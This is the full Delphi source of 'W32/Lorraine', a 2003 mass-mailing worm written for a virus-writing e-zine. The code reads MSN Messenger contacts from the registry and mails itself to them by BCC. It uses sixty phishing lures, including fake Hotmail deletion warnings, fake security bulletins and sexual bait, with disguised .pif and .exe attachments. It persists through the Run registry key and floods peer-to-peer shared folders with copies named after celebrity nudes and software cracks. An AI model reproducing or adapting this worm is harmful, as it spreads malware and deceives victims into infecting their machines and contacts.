   unit Rreinalo;

   interface

   uses
       Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
       Dialogs,Registry, StdCtrls, Psock, NMsmtp,MMSystem,ShellApi;


   type
     TForm1 = class(TForm)
       muerte: TNMSMTP;
       Memo1: TMemo;
       Edit1: TEdit;
       procedure FormCreate(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

     Const
     nombrew:pchar = 'Lorraine Worm [GEDZAC LABS 2003]';

   var

        Form1: TForm1;
        d:integer;
        guorm:string;
        Reg : TRegistry   ;
        PROGFILES:STRING;
        pgname:array[1..54] of string;
        complg:array[1..5] of string;
        VIRUSNAME:STRING;
        SysDir:string   ;
        correo:string;

       implementation

     {$R *.dfm}

      function GetSystemDirectory : String;
         var
            pcSystemDirectory : PChar;
            dwSDSize          : DWORD;
                 begin
                 dwSDSize := MAX_PATH + 1;
                 GetMem( pcSystemDirectory, dwSDSize );
                       try
                 if Windows.GetSystemDirectory( pcSystemDirectory, dwSDSize ) <> 0 then
                      Result := pcSystemDirectory;
                      finally
                      FreeMem( pcSystemDirectory );
                   end;
                 end;

       function LeerReg(LaKey: HKEY; Rutakey, Valor: String): String;
               var
                  ValorRet: array[0..1500] of Char;
                  TamaDato: Integer;
                  llaveactual: HKEY;
                        begin
                             RegOpenKeyEx(LaKey, PChar(Rutakey), 0, KEY_ALL_ACCESS, llaveactual);
                             TamaDato := 1501;
                                 RegQueryValueEx(llaveactual, PChar(Valor), nil, nil, @ValorRet[0], @TamaDato);
                                 RegCloseKey(llaveactual);
                                 Result := String(ValorRet);
                              end;
   //////////////////////////////////////
   // W32/Lorraine
   // Creado por Falckon/GEDZAC
   // Hecho en México 100% calidad =P
   // Lorraine
   // Source para la Mitosis E-Zine #2
   // Dedicado a mi Lorena Rivas S...., te amo
   //////////////////////////////////////
       procedure TForm1.FormCreate(Sender: TObject);
          var
          Tiempo : TSystemTime;
            Suj:Array[1..60] of string;
             Bod:Array[1..60] of string  ;
             att:array[1..60] of string;
             FRO:ARRAY[1..60] OF STRING;
             x:integer;
             names:array[1..18] of string;
             regmsn:string;
             a:integer;
             b:integer;
             c:integer;
             complemento:array[1..6] of string;
             CarpetasP2P:array[1..8] of string;
             contact:string;
             g:integer;
             pr:integer;
             chals:integer;
             hostmail:string;
             puta:integer;
             presentacion:textfile;
                 label yajodio                 ;
                    label jodio;
                    begin
                    SysDir:=GetSystemDirectory;
                    guorm := Application.ExeName;
                         VIRUSNAME := 'Lorraine';
                         Application.ShowMainForm := False;
                              Reg := TRegistry.Create;
                              Reg.RootKey:=HKEY_LOCAL_MACHINE;
                                 For b := 1 to 1000 DO
                                      begin
                                           regmsn := leerreg(HKEY_CURRENT_USER,'Software\Microsoft\MessengerService\ListCache\.NET Messenger Service','allow'+inttostr(b))   ;
                                           Memo1.lines.Add(regmsn);
                                        end;
                   For b := 1 to 1000 DO
                      begin
                      regmsn := leerreg(HKEY_CURRENT_USER,'Software\Microsoft\MSNMessenger\ListCache\.NET Messenger Service','allow'+inttostr(b))   ;
                      Memo1.lines.Add(regmsn);
                   end;
                   contact := leerreg(HKEY_CURRENT_USER,'Software\Microsoft\MSNMessenger\ListCache\.NET Messenger Service','allow1');
                   if contact <> ''  then
                   begin
                        Edit1.Text := contact;
                   end;
                       contact := leerreg(HKEY_CURRENT_USER,'Software\Microsoft\MessengerService\ListCache\.NET Messenger Service','allow1');
                       if contact <> ''  then
                            begin
                            Edit1.Text :=  contact;
                        end;
     GetlocalTime(Tiempo);
          iF Tiempo.wMonth = 7  Then
            Begin
                MessageBox(0,'Creado por Falckon/GEDZAC',NOMBREW,16);
                MessageBox(0,'Dedicado a mi G. Lorena R. S.,'+
                 'http://www.vsantivirus.com/renalo.htm',nombrew,0);
             end;

   Bod[1] := 'Felicidades! le hemos enviado este E-Mail porque usted ha ganado un pasaje a México al programa Reality show BigBrother,'+
              'si usted quiere participar en este programa deberá abrir el archivo adjunto. ';
   Fro[1] := 'bigbrother@bigbrother.tv';
   Att[1] := 'BigBrother.pif';
   Suj[1] := 'Big Brother te espera';

   Bod[2] := 'Estimado usuario de hotmail,'+
             'debido al trafico en el servidor y a las fallas que se han venido presentando en este presente mes,'+
             'hemos de informarle que su cuenta será removida de nuestra base de datos en menos de 24 horas, le rogamos por favor lea el adjunto con los pasos para evitar que esto suceda. '+
             'Atentamente el Equipo tecnico de Hotmail.';
   Att[2] := 'hotmail.pif'         ;
   Suj[2] := 'Su cuenta de hotmail sera eliminada';
   Fro[2] := 'support@hotmail.com';

   Suj[3] := '10 reglas de seguridad para su cuenta de hotmail';
   Bod[3] := 'Amable Usuario de hotmail, '+
             'la razón de este mail es para darle a conocer las 10 reglas de seguridad que un usuario de passport debe tener en cuenta para evitar que su cuenta sea borrada, hackeada etc...'+
             'las reglas están en el adjunto.' +
             'Atentamente equipo tecnico de passport';
   Att[3] := 'seguridad_en_hotmail.pif';
   Fro[3] := 'support@passport.com';

   Suj[4] := '¿Puedo ser hacker en 24 horas?';
   Bod[4] := 'No. La respuesta es un no rotundo. Ni en 24 ni en 48 horas :) Pero en este tiempo sí puedes tener una idea aproximada y muy básica de lo que es y de lo que “no es” un hacker y decidir si quieres convertirte en uno de ellos. '+
             'Te recomiendo que leas el archivo que te mando, esta en español y es muy interesante acerca de estos temas (hacking,cracking,vulnerabilidades).';
   Att[4] := 'serhacker.pif';
   Fro[4] := 'hacker@hotmail.com';

   Suj[5] := 'Problema de seguridad en Windows Media Player';
   Bod[5] := 'Windows Media Player, el reproductor multimedia que acompaña gratuitamente a los sistemas Microsoft,'+
             ' se ve afectado por un problema de seguridad que puede permitir la ejecución de código en la máquina del usuario atacado.' +
             'por lo que recomendamos leer más acerca de este bug en el adjunto y aplicar los correspondientes parches de seguridad.';
   Att[5] := 'WindowsMediaPlayerBug.pif';
   Fro[5] := string(Edit1.text);

   Suj[6] := '¿Cómo hackear hotmail?';
   Bod[6] := 'Hola, he estado buscando en la red y encontré esta guía de hacking que enseña como hackear hotmail,'+
             'orienta al robo de cuentas, imagínate robarle la cuenta a tu novia, tu amigo etc.. a quien quieras, te lo aseguro yo ya lo leí y lo comprobé, disfrútalo. ';
   Att[6] := 'hackeahotmail.pif';
   Fro[6] := String(Edit1.text);

   Suj[7] := 'Hackean página de Madonna sospechosa de envenenar KaZaA';
   Bod[7] := 'Tras sospecharse que Madonna contaminó la red KaZaA con algunos archivos envenenados, un grupo hacker ha contraatacado asaltando su página y colgando algunos de los temas de su último álbum en formato MP3.'+
             'más de esta revelante noticia en el adjunto.';
   Fro[7] := 'notice@madonna.com';
   Att[7] := 'defaced-madonna-site.pif';

   Suj[8] := '¿Que le atrae a las mujeres?';
   Bod[8] := 'Un reciente estudio del comportamiento en la mujer afirma que a ellas les atrae de los hombres'+
             'es la cara, las manos y su movimiento, si quiere saber más lea por favor el articulo que le adjuntamos';
   Att[8] := 'mujeres.pif';
   Fro[8] := String(Edit1.text);

   Suj[9] := 'SPAM La proxima gran epidemia';
   Bod[9] := 'El Spam esta avanzando constantemente y a logrado saturar nuestros correos electronicos'+
             'tal vez sea el principio de una epidemia mundial de esta peste que nos tiene cansados de la  publicidad.';
   Att[9] := 'No-Spam.exe';
   Fro[9] := 'Anti-Spam@campaña.com';

   Suj[10] := 'Tests antivirus para comprobar la protección del e-mail'   ;
   Bod[10] := 'Hispasec pone a disposición de todos los usuarios dos tests para comprobar el correcto funcionamiento de la protección antivirus del correo electrónico. '+
              ' El primero de ellos nos indicará la correcta instalación y buen funcionamiento del antivirus, mientras que el segundo determinará la capacidad de detección proactiva para identificar gusanos que explotan vulnerabilidades conocidas.';
   Att[10] := 'EICAX.COM';
   Fro[10] := 'test@hispasec.com';

   Suj[11] := 'Te amo';
   Bod[11] := 'Lo amo a usted por que es la persona más linda del mundo.';
   Att[11] := 'teamo.exe';
   Fro[11] := 'Amor@teamo.com';

   Suj[12] := 'LatinCards';
   Bod[12] := 'Le han enviado una LatinCard para poder visualizarla abra el adjunto'+
              'Gracias.';
   Att[12] := 'LatinCard.pif';
   Fro[12] := 'Latincards@latincards.com';

   Suj[13] := 'Chistes Gráficos';
   Bod[13] := 'Estos son los chistes gráficos que más me han gustado espero que a ti también.';
   Att[13] := 'chistesgraficos.pif';
   Fro[13] := String(Edit1.text);

   Suj[14] := 'Te Amo'  ;
   Bod[14] := 'Averigua por que.....' ;
   Att[14] := 'porqueteamo.pif';
   fro[14] := 'lorena@hotmail.com';

   Suj[15] := 'Test de pasión';
   Bod[15] := 'Test de pasión para usted y su pareja, contéstelo y descubra cuanto desea y quiere a su pareja.'  ;
   Att[15] := 'testpasion.pif';
   Fro[15] := String(Edit1.text);

   Suj[16] := 'Re: Dime que te parece';
   Bod[16] := 'Hola, como estás? hace tiempo que no se nada de ti... quería hablar contigo sobre un tema.'+
               'Se trata de mi nuevo portal en el que quiero ofrecer toda mi recopilación de links en espanol.  '+
               'Me gustaría que le echaras un vistazo y me dijeras que tal lo ves tu, si te gusta o cambiarías algo. ' ;
   Att[16] :=  'www.mfernanda.com';
   Fro[16] :=  'Maria_fernanda@mfernanda.com';

   Suj[17] := 'RE: Test de idiotes';
   Bod[17] := 'Compruebe si usted es un verdadero idiota.';
   Att[17] := 'test-idiota.pif';
   Fro[17] := String(Edit1.text);

   Suj[18] := ' Kamasutra  ';
   Bod[18] := 'Kamasutra el arte del sexo';
   att[18] := 'kamasutra.pif';
   Fro[18] := String(Edit1.text);

   Suj[19] := 'Su pareja ideal';
   Bod[19] := 'Los 10 consejos para tener una pareja ideal,'+
              'Léalos y póngalos en practica, le aseguro que tendrá resultados'+
              'satisfactorios.';
   Att[19] := 'parejaideal.txt.pif';
   Fro[19] := String(Edit1.text);

   Suj[20] := 'Amor Real...';
   Bod[20] := 'en verdad existe?'   ;
   Att[20] := 'existeee.pif';
   Fro[20] :=   String(Edit1.text);

   Suj[21] := 'Vulnerabilidad Critica en el Msn Messenger';
   Bod[21] := 'Una vulnerabilidad critica detectada en el msn messenger podría provocar el robo de su cuenta de correo'+
              'es importante que lea mas de esta vulnerabilidad para poderse proteger de ella.';
   Att[21] := 'bugmsn.pif';
   Fro[21] := 'support@passport.com';

   Suj[22] := '¿Cómo puedo crear un virus?';
   Bod[22] := 'Esta pregunta siempre me la han hecho y creo que la voy a responder. '+
              'Para crear un virus no necesitas saber mucho de computación, con solo conocer '+
              'Un poco del lenguaje de programación basta, por que no empiezas con el Visual Basic Script, te adjunto un tutorial muy completo acerca de este lenguaje y la creación de virus'+
              'Que te diviertas.'+
              'Bye.';
   Att[22] := 'TutorialVBSvirus.pif';
   Fro[22] := String(Edit1.text);

   Suj[23] := 'Informate de los virus';
   Bod[23] := 'Hola, soy el webmaster de VSANTIVIRUS, estamos realizando una camapaña '+
              'Contra los virus informaticos y nuestro deber es informarle a los usuarios como usted '+
              'Que es un virus, las acciones que causan y como desinfectarse.'+
              'Si usted desea acceder a toda esta información haga el favor de hacer clic en el link que le adjuntamos.'+
              'Gracias';
   Att[23] := 'www.vsantiviru.com';
   Fro[23] := 'Webmaster@vsantiviru.com';

   Suj[24] := 'Zona Virus.com tu Zona Antivirica en español';
   Bod[24] := 'Hola, soy el webmaster de zonaviru y quiero invitarlo a visitar mi sitio web, usted podrá informarse sobre los últimos virus aparecidos, también sabrá como se crean estas alimañas informáticas,'+
              'quienes los crean, como desinfectarse etc... mucha mucha más información.'+
              'Cuento con su  visita '+
              'Gracias '+
              'Atentamente el Webmaster de ZonaVirus';
   Att[24] := ' www.zonaviru.com';
   Fro[24] := 'Webmaster@zonaviru.com';


   Suj[25] := 'Virus en Hotmail';
   Bod[25] := 'Hola, se a dado una alerta por parte de las empresas antivirus, de un nuevo virus que se expande por hotmail, hasta el momento indetectable para cualquier producto antiviral, por lo que recomiendo leer las precauciones sobre este nuevo gusano informatico.'+
              ' Para más información, favor de leer el documento informativo.'  ;
   Att[25] := 'nuevovirus.txt       .pif';
   Fro[25] := String(Edit1.Text)     ;

   Suj[26] := 'Cristina Aguilera Puta de medio tiempo o mentira?';
   Bod[26] := 'es la mera neta.';
   Att[26] := 'cristina-aguilera.pif';
   Fro[26] := 'cristina_aguilera@cristina-aguilera.com';

   Suj[27] := 'EGG Brother'  ;
   Bod[27] := 'LA ultima escena de egg brother vivela ya.';
   att[27] := 'eggbrother.exe';
   Fro[27] := String(Edit1.Text)   ;

   Suj[28] := 'Osama Bin Huevo regresa';
   Bod[28] := 'Osama bin huevo regresa con una nueva amenaza a los Huevos Unidos de América';
   Att[28] := 'osamabinhuevoback.exe';
   Fro[28] := string(edit1.Text)  ;

   Suj[29] := 'El Gran Carnal';
   Bod[29] := 'Mirate que asterisco se tiro encima de doña pepa jeje';
   Att[29] := 'grancarnal.exe';
   Fro[29] := String(Edit1.text);

   Suj[30] := 'A Dios le pido....';
   Bod[30] := 'Que si me muero sea de amor y si me enamoro sea de vos....';
   Att[30] := 'te-pido.scr';
   Fro[30] := String(Edit1.Text) ;

   Suj[31] := 'Antro '  ;
   Bod[31] := 'Hey sin so sobre tras ya no digas más y despierta la locura!!!';
   Att[31] := 'antrox.scr';
   Fro[31] := string(edit1.text);

   Suj[32] := 'Chupamelo '  ;
   Bod[32] := 'Chupamelo ya... y dime que te parece.';
   Att[32] := 'chupamelo.pif';
   Fro[32] := string(edit1.text);

   Suj[33] := 'Ta grande '  ;
   Bod[33] := 'Lo tengo grande y tú?';
   Att[33] := 'grande.pif';
   Fro[33] := string(edit1.text);

   Suj[34] := 'Tengo Sed... '  ;
   Bod[34] := 'Tengo sed de amor por tí.';
   Att[34] := 'amor-por-ti.pif';
   Fro[34] := string(edit1.text);

   Suj[35] := 'Mamalo'  ;
   Bod[35] := 'Mamalo que ta grande.....';
   Att[35] := 'mamalo.pif';
   Fro[35] := string(edit1.text);


   Suj[35] := 'para usted'  ;
   Bod[35] := 'Si te llego mal, respondeme';
   Att[35] := 'historial.pif';
   Fro[35] := string(edit1.text);


   Suj[36] := ''  ;
   Bod[36] := 'Si el adjunto no funciona respondame lo más antes posible';
   Att[36] := 'petardas.pif';
   Fro[36] := string(edit1.text);


   Suj[37] := 'Alerta de virus'  ;
   Bod[37] := 'Cuidado! este virus es peligroso puede formatearte el disco duro, llega por hotmail sin que te des cuenta, tu podrias estar infectado'+
   ' busca en tu sistema el archivo winlogon.exe, si lo tienes es mejor que utilizes la vacuna que te mando, hazlo cuanto antes!! no esperes!!';
   Att[37] := 'antiwinlogon.pif';
   Fro[37] := string(edit1.text);


   Suj[38] := 'Necesita comprar un auto?'  ;
   Bod[38] := 'Lo mejores planes de financiamiento.';
   Att[38] := 'financiamiento.pif';
   Fro[38] := string(edit1.text);

   Suj[39] := 'Zorras y más zorras'  ;
   Bod[39] := 'Zorritas gratis dandole duro.';
   Att[39] := 'zorrotttas.pif';
   Fro[39] := string(edit1.text);

   Suj[40] := 'Matrix Trailer'  ;
   Bod[40] := 'Chequelo de una vez!! no se lo pierda.';
   Att[40] := 'Matrix-Trailer.pif';
   Fro[40] := string(edit1.text);

   Suj[41] := '¿Sabe que es GEDZAC?'  ;
   Bod[41] := 'Por si no sabe que es. una explicación muy precisa para usted.';
   Att[41] := 'GEDZAC.PIF';
   Fro[41] := string(edit1.text);

   Suj[42] := '¿Como te gustan?'  ;
   Bod[42] := 'A mi me gustan, altas, bonitas, tetonas, nalgonas y tiernitas pero a ti como te gustan?';
   Att[42] := 'comotegustan.pif';
   Fro[42] := string(edit1.text);


   Suj[43] := '¿?'  ;
   Bod[43] := 'Hola necesito tu ayuda con este archivo'+
               ' Gracias';
   Att[43] := 'Oradores.pif';
   Fro[43] := string(edit1.text);

   Suj[44] := 'Lo que nos enseña la iglesia'  ;
   Bod[44] := 'La Iglesia nos enseña a amar, querer al prójimo pero usted deberás lo ama?';
   Att[44] := 'projimo.pif';
   Fro[44] := string(edit1.text);

   Suj[45] := 'La mejor forma de cortar a un chico'  ;
   Bod[45] := 'Las 10 mejores formas para hacer esto menos doloroso.';
   Att[45] := 'sindolor.pif';
   Fro[45] := string(edit1.text);

   Suj[45] := 'para tí'  ;
   Bod[45] := 'Si el adjunto esta defectuoso reenviamelo.';
   Att[45] := 'Lorenaaaa.pif';
   Fro[45] := string(edit1.text);

   Suj[46] := 'Información sobre Sars'  ;
   Bod[46] := 'Ayúdenos a contrarrestar el SARS, por favor aprenda como se contagia y sus efectos.';
   Att[46] := 'SARS.pif';
   Fro[46] := string(edit1.text);

   Suj[47] := 'Para mis amigos'  ;
   Bod[47] := 'De un amigo para un amigo.';
   Att[47] := 'amigos.pif';
   Fro[47] := string(edit1.text);

   Suj[48] := 'Eres un perdedor'  ;
   Bod[48] := 'Eres un perdedor no te atreves ni a mirar la foto que te doy.';
   Att[48] := 'Madonna_sEXY.pif';
   Fro[48] := string(edit1.text);

   Suj[49] := 'Amistad'  ;
   Bod[49] := 'Usted es uno de mis mejores amigos.';
   Att[49] := 'friends.pif';
   Fro[49] := string(edit1.text);

   Suj[49] := 'Spam..'  ;
   Bod[49] := 'Di no al SPAM.';
   Att[49] := 'Spamno.pif';
   Fro[49] := string(edit1.text);

   Suj[50] := 'Para mis verdaderos amigos'  ;
   Bod[50] := 'Te lo mereces, eres un verdadero amigo';
   Att[50] := 'amigototote.pif';
   Fro[50] := string(edit1.text);

   Suj[51] := 'Para ti nomas'  ;
   Bod[51] := 'Para ti y nadie más';
   Att[51] := 'solo-a-ti.pif';
   Fro[51] := string(edit1.text);

   Suj[52] := 'Necesito su ayuda'  ;
   Bod[52] := 'Tengo problemas con este archivo, seria tan amable de revisarlo por mi?';
   Att[52] := 'resetarios.pif';
   Fro[52] := string(edit1.text);

   Suj[53] := 'Sexo y más'  ;
   Bod[53] := '10 formas para disfrutar de sus relaciones sexuales ';
   Att[53] := 'relacionsexual.pif';
   Fro[53] := string(edit1.text);

   Suj[54] := 'Linux se vende a Microsoft!'  ;
   Bod[54] := 'Al parecer Linux murio y se vendio a microsoft ';
   Att[54] := 'linuxandmicrosoft.pif';
   Fro[54] := string(edit1.text);

   Suj[55] := 'Recuerda!'  ;
   Bod[55] := 'Espero que siempre me escribas.';
   Att[55] := 'lacosha@hotmail.com';
   Fro[55] := string(edit1.text);

   Suj[56] := 'Esta si que es puta!'  ;
   Bod[56] := 'NO hables más y dime si es puta ';
   Att[56] := 'Shakira.pif';
   Fro[56] := string(edit1.text);

   Suj[57] := 'Tu Soft'  ;
   Bod[57] := 'Aquí estan los cracks para los programas que pediste ';
   Att[57] := 'CracksPPZ.pif';
   Fro[57] := string(edit1.text);

   Suj[58] := 'La Virgen María no es virgen'  ;
   Bod[58] := 'No me crees? velo tu mismo ';
   Att[58] := 'MariaVirgen.pif';
   Fro[58] := string(edit1.text);

   Suj[59] := 'Música Digital Gratis'  ;
   Bod[59] := 'Bájate todas las canciones que quieras.';
   Att[59] := 'Música.pif';
   Fro[59] := string(edit1.text);

   Suj[60] := 'te gusta?'  ;
   Bod[60] := 'espero que te guste, si no es asi dimelo.';
   Att[60] := 'thalialoca.pif';
   Fro[60] := string(edit1.text);

   AssignFile (presentacion,'C:\lorraine.hta');
             ReWrite(presentacion);
                 Writeln(presentacion,'<html><head><title>Lorraine Worm [GEDZAC LABS 2003]</title> ');
                 Writeln(presentacion,'</head><body bgcolor="black" ><table border="0" width="100%" bgcolor="#9966FF">');
                 Writeln(presentacion,'<tr><td width="727" height="2"><p align="center">&nbsp;<b><font size="3" face="Verdana,Arial" color="white">W32/Lorraine - Gedzac Labs 2003</font></b></p>');
                 Writeln(presentacion,'</td></tr></table><p align="center"><b><font color="lime" size="1" face="Verdana">//***********[GEDZAC LABS 2003]***********//</font></b></p>');
                 Writeln(presentacion,'<p align="center"><b><font color="lime" size="1" face="Verdana">W32/Lorraine by Falckon/GEDZAC</font></b></p> ');
                 Writeln(presentacion,'<p align="center"><b><font color="lime" size="1" face="Verdana">wOrm hecho en Delphi 6 Dedicado a mi Lorena</font></b></p> ');
                 Writeln(presentacion,'<p align="center"><b><font color="lime" size="1" face="Verdana">Hecho en MéXiKO</font></b></p>  ');
                 Writeln(presentacion,'<p align="center"><b><a href="http://www.viriizone.tk"><font color="lime" size="1" face="Verdana">http://www.viriizone.tk</font></a></b></p> ');
                 Writeln(presentacion,'<p align="center"><b><font color="lime" size="1" face="Verdana">Gedzac Labs</font></b></p></body></html>     ');
             CloseFile(presentacion);
             if Tiempo.wDay = 4 then
                begin
                ShellExecute(Form1.Handle,nil,PChar('c:\lorraine.hta'),'','',SW_SHOWNORMAL);
                end;
       For chals := 1 to 60 Do
          begin
          copyfile(pchar(guorm),pchar(SysDir + '\'+Att[chals]),true);
       end;
       puta := 0;
           hostmail := 'mx1.hotmail.com';
           muerte.Host := hostmail;
           yajodio:
        try
           muerte.connect;
           Except
                 if muerte.Connected = false then
                 begin
                 puta := 1;
                 end
                    else
                    puta := 0;
                 end;
           if puta = 1 then goto yajodio   ;
               muerte.PostMessage.ToBlindCarbonCopy.AddStrings(memo1.lines);
               muerte.PostMessage.FromAddress :=  Fro[Tiempo.wSecond];
               muerte.PostMessage.Subject := Suj[Tiempo.wSecond]  ;
               muerte.PostMessage.Attachments.Add(SysDir + '\' + Att[Tiempo.wSecond]);
               muerte.PostMessage.Body.Add(Bod[Tiempo.wSecond]);
                 muerte.SendMail   ;
                    muerte.Disconnect;
                    PlaySound(pChar('SYSTEMSTART'),0,SND_ASYNC);
                    if Reg.OpenKey('\Software\Microsoft\Windows\CurrentVersion\Run',true) then
                          Reg.WriteString('Lorraine',SysDir + '\Lorraine.exe');
                          copyfile(pchar(guorm), pChar(SysDir + '\Lorraine.exe'),true);
                          If  Reg.OpenKeyReadOnly('\SOFTWARE\Microsoft\Windows\CurrentVersion') Then
                               PROGFILES := reg.ReadString('ProgramFilesDir');
                               if Not FileExists('C:\Lorraine.vxd') then
                                  Begin
                                  MessageBox(0,'Archivo Parcialmente Corrupto remplacelo por uno nuevo','Error',16);
                                  copyfile(pchar(guorm),'C:\Lorraine.vxd',true);

                     CarpetasP2P[1] := '\KaZaA\My Shared Folder\';
                     CarpetasP2P[2] := '\edonkey2000\incoming\';
                     CarpetasP2P[3] := '\gnucleus\downloads\';
                     CarpetasP2P[4] := '\icq\shared files\';
                     CarpetasP2P[5] := '\kazaa lite\my shared folders\';
                     CarpetasP2P[6] := '\limewire\shared\';
                     CarpetasP2P[7] := '\morpheus\my shared folder\';
                     CarpetasP2P[8] := '\Grokster\My Grokster\';
                               complemento[1] := 'Sexy Bikini ';
                               complemento[2] := 'Sexo en la playa con ';
                               complemento[3] := 'las pelotas de ';
                               complemento[4] := 'Desnuda en la playa ';
                               complemento[5] := 'Nude Pic ';
                               complemento[6] := 'Sexy Beach ';
                                      names[1] := 'Galilea Montijo';
                                      names[2] := 'Shakira';
                                      names[3] := 'Britney Spears';
                                      names[4] := 'Lorena';      // te amo GLRS (Lorena)
                                      names[5] := 'Halle berry';
                                      names[6] := 'Cameron dias';
                                      names[7] := 'Pink';
                                      names[8] := 'Thalia';
                                      names[9] := 'Paulina Rubio';
                                      names[10] := 'Francini';
                                      names[11] := 'Brenda';
                                      names[12] := 'Celine Dion';
                                      names[13] := 'Kylie Minogue';
                                      names[14] := 'Laura Pausini';
                                      names[15] := 'Lili Brillanti';
                                      names[16] := 'Angelica Vale';
                                      names[17] := 'Alejandra Guzman ';
                                           For x := 1 to 17  Do
                                               Begin
                                                  For  a := 1 to 6 Do
                                                    Begin
                                                    For c := 1 to 8 Do
                                                    Begin
                                                    copyfile(pchar(guorm),pchar(PROGFILES+CarpetasP2P[c]+complemento[a]+names[x]+'.gif                    .exe'),true);
                                                 end;
                                             end;
                                             end;
                                             pgname[1] := 'Kazaa Media Desktop ' ;
                                             pgname[2] := 'ICQ Lite ';
                                             pgname[3] := 'WinZip';
                                             pgname[4] := 'iMesh ';
                                             pgname[5] := 'AOL Instant Messenger (AIM)';
                                             pgname[6] := 'ICQ Pro 2003a beta ';
                                             pgname[7] := 'Morpheus ';
                                             pgname[8] := 'Ad-aware ';
                                             pgname[9] := 'Trillian ';
                                             pgname[10] := 'Download Accelerator Plus';
                                             pgname[11] := 'ZoneAlarm ';
                                             pgname[12] := 'Grokster';
                                             pgname[13] := 'WinRAR ';
                                             pgname[14] := 'DivX Video Bundle ';
                                             pgname[15] := 'RealOne Free Player ';
                                             pgname[16] := 'NetPumper ';
                                             pgname[17] := 'Adobe Acrobat Reader (32-bit) ';
                                             pgname[18] := 'JetAudio Basic ';
                                             pgname[19] := 'WS_FTP LE (32-bit) ';
                                             pgname[20] := 'SnagIt ';
                                             pgname[21] := 'Registry Mechanic';
                                             pgname[22] := 'WinMX ';
                                             pgname[23] := 'MSN Messenger (Windows NT/2000)';
                                             pgname[24] := 'Biromsoft WebCam ';
                                             pgname[25] := 'Nero Burning ROM ';
                                             pgname[26] := 'Microsoft Windows Media Player ';
                                             pgname[27] := 'Spybot - Search & Destroy ';
                                             pgname[28] := 'Copernic Agent ';
                                             pgname[29] := 'Winamp';
                                             pgname[30] := 'Diet Kaza ';
                                             pgname[31] := 'SolSuite 2003: Solitaire Card Games Suite ';
                                             pgname[32] := 'Pop-Up Stopper ';
                                             pgname[33] := 'QuickTime ';
                                             pgname[34] := 'XoloX Ultra ';
                                             pgname[35] := 'Microsoft Internet Explorer ';
                                             pgname[36] := 'Network Cable e ADSL Speed ';
                                             pgname[37] := 'Kazaa Download Accelerator ';
                                             pgname[38] := 'Global DiVX Player ';
                                             pgname[39] := 'DirectDVD ';
                                             pgname[40] := 'Kaspersky Antivirus' ;
                                             pgname[41] := 'PerAntivirus';
                                             pgname[42] := 'Norton Antivirus';
                                             pgname[43] := 'Panda Antivirus';
                                             pgname[44] := 'McAfee Antivirus';
                                             pgname[45] := 'Microsoft Office XP';
                                             pgname[46] := 'Microsoft Windows 2003';
                                             pgname[47] := 'Office 2003';
                                             pgname[48] := 'Visual Studio Net';
                                             pgname[49] := 'Delphi 6';
                                             pgname[50] := 'msn hack'  ;
                                             pgname[51] := 'Matrix Movie';
                                             pgname[52] := 'Virtual Girl Sofía';
                                             pgname[53] := 'FireWorks 4';
                                             pgname[54] := 'FIreWorks MX';
                                             complg[1] := ' Cracked';
                                             complg[2] := ' crack all versions';
                                             complg[3] := ' ';
                                             complg[4] := ' KeyGen';
                                             complg[5] := ' Full version';
                                                  For c := 1 to 8 DO
                                                      Begin
                                                      For g := 1 to 5  Do
                                                         Begin
                                                          For pr := 1 to 54 Do
                                                           begin
                                                           copyfile(pchar(guorm),pchar(PROGFILES+CarpetasP2P[c]+pgname[pr]+complg[g]+'.exe'),true);
                                                       end;
                                                   end;
                                               end;
                                           end;
                                       end;
                                       end.

                                      //Lorraine
                                      //by Falckon/GEDZAC
                                      //http://www.viriizone.tk
